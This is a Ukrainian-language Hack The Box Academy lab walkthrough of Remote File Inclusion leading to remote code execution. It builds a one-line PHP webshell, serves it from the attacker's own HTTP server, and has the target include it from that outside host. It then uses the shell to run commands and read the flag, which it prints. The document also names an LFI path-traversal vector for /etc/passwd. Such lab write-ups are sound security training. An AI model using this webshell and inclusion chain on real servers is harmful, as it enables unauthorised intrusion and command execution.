## LFI → RFI: Remote File Inclusion + RCE

**Модуль:** [File Inclusion](https://academy.hackthebox.com/app/module/23)
**Секція:** [Remote File Inclusion](https://academy.hackthebox.com/app/module/23/section/254)
**Завдання:** Exploitувати RFI → RCE → знайти flag у `/`
**Прапор:** `99a8fc05f033f2fc0cf9a6f9826f83f4`

***

## Концепція

**RFI (Remote File Inclusion)** — `include()` завантажує файл з зовнішнього URL. Потребує `allow_url_include = On` та `allow_url_fopen = On`. На відміну від `data://` — PHP-код живе на **нашому сервері**, ціль його завантажує і виконує.

***

## Крок 1 — Перевірка RFI через loopback

```bash
curl -s "http://10.129.29.114/index.php?language=http://127.0.0.1:80/index.php" | grep -i "inlane"
# Якщо відповідь прийшла — allow_url_fopen/include увімкнені
```

> Якщо `php.ini` не читається через фільтр — тестуємо RFI напряму через loopback. Відповідь підтверджує що remote include працює.

***

## Крок 2 — Створюємо webshell та запускаємо HTTP сервер

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
cd /tmp
sudo python3 -m http.server 80
```

У другому терміналі — виконуємо запити. Python сервер логує кожне звернення цілі:

```
10.129.29.114 - - [17/Jun/2026 04:30:53] "GET /shell.php HTTP/1.0" 200 -
```

***

## Крок 3 — Верифікація RCE

```bash
curl -s "http://10.129.29.114/index.php?language=http://10.10.14.214/shell.php&cmd=id" | grep uid
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

***

## Крок 4 — Знайти прапор

```bash
# Список директорій у /
curl -s "http://10.129.29.114/index.php?language=http://10.10.14.214/shell.php&cmd=ls+/" \
  | grep -v "^$\|<\|html\|DOCTYPE"
# exercise  ← нестандартна директорія

# Читаємо прапор
curl -s "http://10.129.29.114/index.php?language=http://10.10.14.214/shell.php&cmd=cat+/exercise/flag.txt" \
  | grep -v "^$\|<\|DOCTYPE\|html\|css\|Notice\|meta\|link\|title\|body\|div\|ul\|li\|href\|class"
# 99a8fc05f033f2fc0cf9a6f9826f83f4
```

***

## Різниця LFI vs RFI

| | LFI | RFI |
|---|---|---|
| Джерело файлу | Локальна ФС сервера | Зовнішній URL (наш сервер) |
| Вектор | `../../../../etc/passwd` | `http://OUR_IP/shell.php` |
| Умова | Завжди (якщо є include) | `allow_url_include=On` |
| Webshell | Через log poisoning / upload | Напряму — наш PHP файл |
| Складність | Вища (потрібен файл на цілі) | Нижча (контролюємо файл повністю) |

***

## Повний ланцюг атаки

```
[Перевірка RFI] → curl .../language=http://127.0.0.1/index.php → відповідь є
        ↓
[Webshell] → echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
        ↓
[Python HTTP server] → sudo python3 -m http.server 80
        ↓
[RCE] → ?language=http://OUR_IP/shell.php&cmd=id
        ↓
[Розвідка] → &cmd=ls+/ → знаходимо /exercise/
        ↓
[Прапор] → &cmd=cat+/exercise/flag.txt
```

***

## Прапор

```
99a8fc05f033f2fc0cf9a6f9826f83f4
```
